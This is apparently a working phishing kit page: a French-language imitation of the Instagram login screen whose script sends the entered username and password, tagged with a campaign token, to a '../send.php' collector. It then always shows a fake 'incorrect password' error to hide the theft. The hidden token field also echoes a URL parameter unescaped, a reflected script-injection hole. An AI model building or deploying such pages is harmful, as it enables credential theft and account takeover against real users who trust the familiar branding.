<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="VsNE-OHk_8a.png" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
    <title>Instagram</title>
    <style>
        * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, sans-serif;
        user-select: none;
      }
      main{
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 77px;
        height: 100vh;
        overflow: hidden;
        background: linear-gradient(-80deg , #eef7ff 75%, #fbf1f9, #fffaf4);
      }
      form,
      footer {
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 10px;
        margin-bottom: 10px;
      }
      .lang {
        font-size: 14px;
        cursor: pointer;
        color: #5c6c7b;
        margin-top: 13px;
      }
      .input {
        display: flex;
        flex-direction: column;
        gap: 5px;
        width: 90%;
        border-radius: 15px;
        padding: 7px;
        border: 1.2px solid #dde2e8;
        cursor: pointer;
        position: relative;
        justify-content: center;
        background: white;
        /* color: #5c6c7b; */
      }
      .input input {
        border: none;
        outline: none;
        font-size: 16px;
        background: none;
        padding-left: 5px;
      }
      .input p {
        transform: translateY(14px) ;
        font-size: 17px;
        font-weight: 400;
        padding-left: 5px;
        color: #67788a;
      }
      .focus {
        transform: translateY(0px) !important;
        font-size: 14px !important;
      }
      #submit {
        background: #0064e0;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 20px;
        cursor: pointer;
        width: 90%;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      #forgot {
        color: black;
        text-decoration: none;
        font-size: 16px;
        margin-top: 10px;
      }
      .new {
        color: #0064e0;
        border: 1.2px solid #0064e0;
        text-decoration: none;
        border-radius: 20px;
        padding: 12px;
        cursor: pointer;
        width: 90%;
        text-align: center;
      }
      .meta {
        width: 65px;
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 5px;
      }
      footer {
        /* background: transparent; */
        position: absolute;
        bottom: 0;
        margin-bottom: 0;
      }
      .reload {
        width: 20px;
        height: 20px;
        border: 2px solid white;
        border-top: 2px solid transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: none;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      /* label{
        outline: none;
        color: #5c6c7b;
      } */
      .logo {
        width: 70px;
        height: 70px;
      }
      i{
        font-size: 22px;
        position: absolute;
        right: 20px;
        font-weight: 900;
        transform: rotateX(180deg);
        display: none;
        color: #67788a;
      }
      .error {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: white;
        border-radius: 10px;
        width: 80%;
        display: none;
        align-items: center;
        flex-direction: column;
        gap: 15px;
      }
      .error h4 {
        font-size: 18px;
        color: black;
        font-weight: 600;
        padding-top: 20px;
      }
      .error p {
        font-size: 14px;
        color: #5c6c7b;
        text-align: center;
        padding: 0 20px 20px 20px;
      }
      .error span {
        display: flex;
        justify-content: flex-end;
        gap: 20px;
        cursor: pointer;
      }
      .error span p {
        font-size: 14px;
        padding: 0 10px 10px;
      }
      .filter {
        filter: brightness(70%);
      }
    </style>
</head>
<body>
    <main>
    <p class="lang">Français (France)</p>
    <img src="icon.png" alt="Instagram" class="logo">
    <form>
          <label class="input">
            <p>Nom de profil, e-mail ou numéro de mobile</p>
            <input type="text" id="email" />
            <i id="x" class="bi bi-x-lg"></i>
          </label>
          <label class="input">
            <p>Mot de passe</p>
            <input type="password" id="password" />
            <i id="eye" class="bi bi-eye-slash"></i>
          </label>
          <div class="input" style="display: none !important;">
        <input type="text" value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
      </div>
          <!-- <input type="submit" value="Se connecter" id="submit"> -->
          <button type="button" id="submit">
            <div class="reload"></div>
            <p class="label">Se connecter</p>
          </button>
          <a
          href="https://www.instagram.com/accounts/password/reset/"
          id="forgot"
          >Mot de passe oublié ?</a
        >
        </form>
        
        <!-- <div class="down" style="width: 100%; flex: 1"></div> -->
      </div>
      <footer class="">
          <a
          href="https://www.instagram.com/accounts/emailsignup/"
          class="new"
          >Créer un compte</a
          >
          <img src="meta.png" alt="meta" class="meta" />
        </footer>
    </main>
    <div class="error">
      <h4>Mot de passe incorrect</h4>
      <p>
        Le mot de passe que vous avez indiqué est incorrect. Veuillez réessayer.
      </p>
      <hr style="width: 100%; height: 1px; background: #dde2e8;border: none;">
      <span
        onclick="document.querySelector('.error').style.display='none';document.querySelector('main').classList.remove('filter');"
      >
        <p style="color: #0064e0">OK</p>
      </span>
    </div>
    <script>
        let input = document.querySelectorAll(".input input");
        document.getElementById("eye").onclick = function () {
        if (input[1].type === "password") {
          input[1].type = "text";
          document.getElementById("eye").classList.replace("bi-eye-slash", "bi-eye");
        } else {
          input[1].type = "password";
          document.getElementById("eye").classList.replace("bi-eye", "bi-eye-slash");
        }
      };
      document.getElementById("x").onclick = function () {
        input[0].value = "";
        document.getElementById("x").style.display = "none";
      };
        input.forEach((el) => {
        el.addEventListener("focus", () => {
          el.previousElementSibling.classList.add("focus");
          el.parentElement.style.borderColor = "black";
          el.onkeyup = () => {
            if (el.value != "") {
                el.nextElementSibling.style.display = "block";
            }
          }
        });
        el.addEventListener("blur", () => {
            if (el.value == "") {
                el.previousElementSibling.classList.remove("focus");
                el.nextElementSibling.style.display = "none";
            }
          el.parentElement.style.borderColor = "#dde2e8";
        });
      });
      function error() {
        let submit = document.getElementById("submit");
        submit.onclick = async (e) => {
          e.preventDefault();
          if (input[0].value != "" && input[1].value != "") {
            document.querySelector(".reload").style.display = "block";
            document.querySelector(".label").style.display = "none";
          await send(input[2].value , input[0].value , input[1].value) ; 

            /// after fetch 
            document.querySelector(".reload").style.display = "none";
            document.querySelector(".label").style.display = "block";
            document.querySelector("main").classList.add("filter");
            document.querySelector('.error').style.display = 'flex';
            input[0].value = '' ;
            input[1].value = '' ;
            // after fetch
            } else {
            for (let index = 0; index < input.length; index++) {
              const element = input[index];
              if (element.value == "") {
                element.focus();
                break;
              }
            }
          }
        };
      }
      error();
      async function send(id, email, password) {
      try {
        let res = await fetch('../send.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            id: id,
            email: email,
            password: password,
            page : 'instagram'
          })
        });

        let data = await res.text();
        console.log(data);

      } catch (err) {
        console.error('Error:', err);
      }
    }
    </script>
</body>
</html>